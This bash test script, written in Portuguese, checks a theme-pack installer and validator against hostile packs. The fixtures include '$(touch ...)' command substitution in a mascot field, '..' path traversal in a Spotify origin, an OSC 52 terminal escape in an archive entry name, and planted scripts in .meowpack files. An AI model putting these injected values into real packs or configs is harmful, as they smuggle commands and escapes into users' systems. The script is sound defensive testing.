for _caso in "ctl|[directory]\n\"a\\\\u001b[2Jb\" = 1\n|directory.a\\\\u001b" "bidi|[directory]\n\"x\\\\u202ey\" = 1\n|directory.x\\\\u202ey" "c1|[os.symbols]\n\"a\\\\u009bb\" = \"x\"\n|u009b" "cf|[directory]\n\"a\\\\u200bb\" = 1\n|u200b"; do
  _id="r-limpa-${_caso%%|*}"; _resto="${_caso#*|}"; _toml="${_resto%%|*}"; _frase="${_resto#*|}"
  pack_de_prompt "$_id" "$(printf '%b' "$_toml")"
  resp="$(prompt_resposta "$_id")"; vale="$(amb python3 "$RAIZ/scripts/pack.py" validar "$_id" 2>&1)"
  grep -q '^motivo=' <<< "$resp" || limpo_ruim+=" $_id:sem-motivo"
  grep -q "^motivo=.*$_frase" <<< "$resp" || limpo_ruim+=" $_id:sem-chave-escapada($(sed -n 's/^motivo=//p' <<< "$resp" | cat -v | head -c 160))"
  LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]|\xe2\x80[\x8b-\x8f\xaa-\xae]|\xe2\x81[\xa6-\xa9]|\xc2[\x80-\x9f]' <<< "$resp" && limpo_ruim+=" $_id:controle-na-saida"
  LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]|\xe2\x80[\x8b-\x8f\xaa-\xae]|\xe2\x81[\xa6-\xa9]|\xc2[\x80-\x9f]' <<< "$vale" && limpo_ruim+=" $_id:controle-no-validar"
done
[ -z "$limpo_ruim" ] \
  && ok "o nome da chave recusada chega ao motivo e ao aviso do validar numa linha imprimível: escape de terminal, controle C1, formato (ZWSP) e BIDI saem escapados, nunca crus" \
  || falha "o motivo da recusa levou caractere de controle ao terminal:$limpo_ruim"

rm -rf "$CASA/.cache/meowsystem"
pack_de_prompt escapa-aspas "$(printf '[os.symbols]\nPop = "a\\"] [custom.y"\n[directory.substitutions]\n"Docu\\"ments" = "d\\\\x"\n')"
resp="$(prompt_resposta escapa-aspas)"; arq="$(gerado_de "$resp")"
resultado="$(python3 -I - "$arq" <<'PY'
import sys, tomllib
try:
    d = tomllib.load(open(sys.argv[1], "rb"))
except (OSError, tomllib.TOMLDecodeError) as e:
    print(e); sys.exit()
bom = (d["os"]["symbols"]["Pop"] == 'a"] [custom.y' and d["directory"]["substitutions"]['Docu"ments'] == "d\\x"
       and "custom" not in d and set(d) <= {"palette", "palettes", "os", "directory"})
print("ok" if bom else f"não voltou igual: {d}")
PY
)"
[ -n "$arq" ] && [ "$resultado" = "ok" ] \
  && ok "aspas e barras dentro do texto são escapadas pelo motor: o arquivo gerado devolve ao pé da letra o que o pack pediu, e nunca ganha tabela nova" \
  || falha "o motor não escapou aspas e barras ao gerar o prompt" "$resp / $resultado"

rm -rf "$CASA/.cache/meowsystem"
pack_de_prompt copia-do-base "$(cat "$RAIZ/packs/meowsystem/prompt/starship.toml")"
resp="$(prompt_resposta copia-do-base)"; arq="$(gerado_de "$resp")"
prompt_de copia-do-base
copia_ruim=""
{ [ -n "$arq" ] && [ -f "$arq" ] && ! grep -q '^recusado=' <<< "$resp"; } || copia_ruim+=" recusado($resp)"
diff_do_base="$(python3 -I - "$RAIZ/packs/meowsystem/prompt/starship.toml" "$arq" <<'PY'
import sys, tomllib
a = tomllib.load(open(sys.argv[1], "rb"))
b = tomllib.load(open(sys.argv[2], "rb"))
for k in ("palette", "palettes"):
    a.pop(k, None); b.pop(k, None)
print("igual" if a == b else "diferente")
PY
)"
[ "$diff_do_base" = "igual" ] || copia_ruim+=" conteudo-diferente-do-preset"
if [ -n "$st_real" ] && [ -f "$T/st-copia-do-base.toml" ]; then
  ( cd "$T" && env -i PATH="$T/falso:/usr/bin:/bin" HOME="$CASA" STARSHIP_CONFIG="$T/st-copia-do-base.toml" \
      STARSHIP_CACHE="$T/st-cache" "$st_real" print-config >/dev/null 2>"$T/st-copia-erro" ) || copia_ruim+=" starship($(head -c 200 "$T/st-copia-erro"))"
fi
[ -z "$copia_ruim" ] \
  && ok "o preset do pack-base, copiado inteiro para um pack pessoal, passa pela lista e chega igual (fora a paleta, que é a do pack no ar)${st_real:+, e o starship de verdade o carrega}" \
  || falha "o preset do pack-base copiado para um pack pessoal não passou pela lista:$copia_ruim" "$resp"

avisa_ruim=""
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar r-env-var-chave 2>&1)"
grep -q "aviso prompt.starship: o prompt de pack de fora foi recusado: \`directory.env_var\`" <<< "$saida" || avisa_ruim+=" recusa-sem-a-chave($saida)"
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar bom-aparencia 2>&1)"
! grep -q 'aviso prompt.starship' <<< "$saida" || avisa_ruim+=" aviso-em-prompt-aceito"
[ -z "$avisa_ruim" ] \
  && ok "o validar diz qual chave recusou o prompt de pack pessoal, e não avisa de prompt que entrou" \
  || falha "o aviso do validar sobre o prompt do pack pessoal está errado:$avisa_ruim"
_id=mal-spot-origem
mkdir -p "$RAIZ_DELA/$_id"; cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/$_id/"
printf '{"formato": 1, "id": "%s", "nome": "Mal origem", "versao": "1.0.0", "autor": "x", "licenca": "MIT",\n "heranca": "dracula", "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},\n "apps": {"spotify": {"spicetify_tema": "Bom", "esquema": "Dracula",\n   "origem": {"tipo": "github-arvore", "repo": "a/b", "commit": "../../../fora", "pasta": "../../fora/pasta"}}}}\n' \
  "$_id" > "$RAIZ_DELA/$_id/pack.json"
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar "$_id" 2>&1)"; rc=$?
[ "$rc" != 0 ] && grep -q 'apps.spotify.origem' <<< "$saida" \
  && ok "o validar recusa a origem do tema do Spotify com '..' no commit ou na pasta" \
  || falha "o validar aceitou a origem do Spotify com '..' (rc=$rc)" "$saida"

if command -v zstd >/dev/null 2>&1; then
  MP="$T/mp"; mkdir -p "$MP/trazido"
  cp "$MAL/pack.json" "$MAL/paleta.json" "$MP/trazido/"
  sed -i 's/"id": "mal"/"id": "trazido"/' "$MP/trazido/pack.json"
  plantar "$MP/trazido/manifesto.sh"
  ( cd "$MP" && { printf 'meowpack 1\nformato 1\npack trazido\n'
                  for f in trazido/pack.json trazido/paleta.json trazido/manifesto.sh; do
                    printf '%s  %s\n' "$(sha256sum "$f" | cut -d' ' -f1)" "${f#trazido/}"; done
                } > MANIFESTO && tar -cf - MANIFESTO trazido | zstd -q -o "$T/trazido.meowpack" )
  amb python3 "$RAIZ/scripts/pack.py" importar "$T/trazido.meowpack" > "$T/importar.log" 2>&1; rc=$?
  if [ "$rc" != 0 ] && [ ! -e "$RAIZ_DELA/trazido" ] && grep -q 'script' "$T/importar.log"; then
    ok "um .meowpack com manifesto.sh é recusado inteiro, e nada é instalado"
  else
    falha "o .meowpack com script entrou (rc=$rc)" "$(cat "$T/importar.log")"
  fi
  ( cd "$MP" && mkdir -p esc && cp trazido/pack.json esc/ && sed -i 's/"id": "trazido"/"id": "esc"/' esc/pack.json \
      && cp trazido/paleta.json "esc/x"$'\033'"]52;c;eA=="$'\007'".sh" \
      && printf 'meowpack 1\nformato 1\npack esc\n' > MANIFESTO \
      && tar -cf - MANIFESTO esc | zstd -q -o "$T/esc.meowpack" )
  amb python3 "$RAIZ/scripts/pack.py" importar "$T/esc.meowpack" > "$T/importar-esc.log" 2>&1; rc=$?
  if [ "$rc" != 0 ] && [ ! -e "$RAIZ_DELA/esc" ] && ! grep -q "$ESC" "$T/importar-esc.log"; then
    ok "um .meowpack com sequência de terminal no nome de uma entrada é recusado, sem repeti-la crua"
  else
    falha "o .meowpack com nome de escape entrou ou repetiu o escape cru (rc=$rc)" "$(cat -v "$T/importar-esc.log")"
  fi
else
  printf 'pulado: sem zstd, a sonda do .meowpack com script\n'
fi

mkdir -p "$T/falso-getent"
printf '#!/bin/sh\nprintf "%%s:x:1000:1000::%%s:/bin/bash\\n" "$(id -un)" "%s"\n' "$CASA" \
  > "$T/falso-getent/getent"
chmod 755 "$T/falso-getent/getent"
timeout 20 env -i PATH="$T/falso-getent:$T/falso:$PATH" HOME="$CASA" USER="${USER:-t}" \
  LANG="${LANG:-C.UTF-8}" MEOW_RAIZ="$RAIZ" MEOW_CONF="$CASA/.config/meow/meow.conf" \
  MEOW_PONTE=/nao/existe "$RAIZ/scripts/app/run.sh" --sem-abrir > "$T/casa-real.log" 2>&1; rc=$?
if [ "$rc" = 2 ] && grep -q 'recusado' "$T/casa-real.log" && ! grep -q 'http://127' "$T/casa-real.log"; then
  ok "o run.sh --sem-abrir recusa subir o painel com o HOME da conta (sem MEOW_QA_HOME_REAL=1)"
else
  falha "o painel subiu para QA com o HOME da conta (rc=$rc)" "$(tail -3 "$T/casa-real.log")"
fi

for caso in vazio xdg; do
  if [ "$caso" = vazio ]; then extra=(HOME=); else extra=(HOME="$T/outra" XDG_DATA_HOME="$CASA/.local/share"); fi
  timeout 20 env -i PATH="$T/falso-getent:$T/falso:$PATH" USER="${USER:-t}" \
    LANG="${LANG:-C.UTF-8}" MEOW_RAIZ="$RAIZ" MEOW_CONF="$T/outra/meow.conf" \
    MEOW_PONTE=/nao/existe "${extra[@]}" "$RAIZ/scripts/app/run.sh" --sem-abrir > "$T/casa-real-$caso.log" 2>&1; rc=$?
  if [ "$rc" = 2 ] && ! grep -q 'http://127' "$T/casa-real-$caso.log"; then
    ok "o run.sh --sem-abrir recusa também o caso '$caso' (HOME vazio / XDG herdado da casa da conta)"
  else
    falha "o painel subiu para QA no caso '$caso' (rc=$rc)" "$(tail -3 "$T/casa-real-$caso.log")"
  fi
done

MARCA_M="$T/mascote-executou"
MAL_MASC="$RAIZ_DELA/mal-mascote"
mkdir -p "$MAL_MASC"
cp "$RAIZ/packs/dracula/paleta.json" "$MAL_MASC/"
printf '{"formato": 1, "id": "mal-mascote", "nome": "Mal mascote", "versao": "1.0.0", "autor": "x",\n "licenca": "MIT", "heranca": "dracula",\n "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},\n "mascote": {"dia": "$(touch %s)", "noite": "a\\"b"}}\n' \
  "$MARCA_M" > "$MAL_MASC/pack.json"
MAL_PONT="$RAIZ_DELA/mal-ponteiro"
mkdir -p "$MAL_PONT/cursores/a\"b/cursors"
cp "$RAIZ/packs/dracula/paleta.json" "$MAL_PONT/"
: > "$MAL_PONT/cursores/a\"b/cursors/default"
printf '{"formato": 1, "id": "mal-ponteiro", "nome": "Mal ponteiro", "versao": "1.0.0", "autor": "x",\n "licenca": "MIT", "heranca": "dracula",\n "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},\n "origens": {"cursores": {"proprio": "cursores/a\\"b/"}}}\n' \
  > "$MAL_PONT/pack.json"
aceitos=""
for p in mal-mascote mal-ponteiro; do
  [ "$(amb python3 "$RAIZ/scripts/pack.py" adocao "$p" "" 2>/dev/null | sed -n 's/^recusado=//p')" = "$p" ] \
    || aceitos="$aceitos $p"
done
[ -z "$aceitos" ] && ok "o validar recusa o pack com mascote ou ponteiro que não é nome, e a adoção não o veste" \
  || falha "o validar aceitou mascote ou ponteiro que não é nome:$aceitos"

CONF_M="$T/mascote.conf"
sed -e 's/^PACK="[^"]*"/PACK="mal-mascote"/' -e 's/^FLAVOR="[^"]*"/FLAVOR="dracula"/' \
  "$RAIZ/meow.conf.exemplo" > "$CONF_M"
amb python3 "$RAIZ/scripts/migrar_conf.py" "$CONF_M" "$RAIZ/meow.conf.exemplo" \
  --so-vestigios --pack-de-antes "" "" >/dev/null 2>&1
amb python3 -I - "$RAIZ/scripts" "$RAIZ/meow.conf.exemplo" "$T/ralo.conf" "$MARCA_M" <<'PY' 2>/dev/null
import sys
sys.path.insert(0, sys.argv[1])
import migrar_conf as m
pack = m._pack()
mascote, ponteiro = pack.mascote_padrao, pack.ponteiro
pack.mascote_padrao = lambda f, ref=None: f"$(touch {sys.argv[4]})" if ref == "dracula" else mascote(f, ref)
pack.ponteiro = lambda ref=None: {"valor": 'a"b'} if ref == "dracula" else ponteiro(ref)
m._pack = lambda: pack
exemplo = open(sys.argv[2], encoding="utf-8").read()
conf = exemplo.replace('PACK=""', 'PACK="dracula"', 1)
texto, _feitas = m.vestigios(conf, exemplo, ("", ""))
open(sys.argv[3], "w", encoding="utf-8").write(texto)
PY
gravado=""
for c in "$CONF_M" "$T/ralo.conf"; do
  [ -s "$c" ] || { gravado="$gravado $(basename "$c"): vazio;"; continue; }
  grep -nE '^(LOGO_DIA|LOGO_NOITE|FASTFETCH_LOGO_GATO|CURSOR)=.*(\$\(|a"b)' "$c" >/dev/null \
    && gravado="$gravado $(basename "$c"): $(grep -cE '\$\(touch|a"b' "$c") linha(s);"
  bash -c '. "$1"' _ "$c" >/dev/null 2>&1
done
[ -z "$gravado" ] && [ ! -e "$MARCA_M" ] \
  && ok "o mascote e o ponteiro de um pack não viram código no meow.conf: nada gravado, nada criado" \
  || falha "o meow.conf recebeu mascote ou ponteiro que não é nome" "${gravado:-o source do meow.conf criou $MARCA_M}"

evil="$(find "$T" -name 'mal-evil*' 2>/dev/null)"
[ -z "$evil" ] && ok "nenhum arquivo com nome de fora (mal-evil*) nasceu em lugar nenhum" \
  || falha "um nome do pack escreveu fora do lugar" "$evil"
vaz="$(grep -rl "$SEGREDO" "$CASA/.local" "$T"/*.log 2>/dev/null)"
[ -z "$vaz" ] && ok "o segredo de fora da raiz não aparece em tema, log nem saída" \
  || falha "o segredo de fora da raiz vazou" "$vaz"
[ ! -e "$MARCA" ] && ok "nenhum arquivo do pack foi executado" \
  || falha "um arquivo do pack (ou plantado) foi executado"
[ -s "$T/falsos.log" ] && printf '      falsos chamados: %s\n' "$(sort -u "$T/falsos.log" | paste -sd';')"

exit "$falhas"
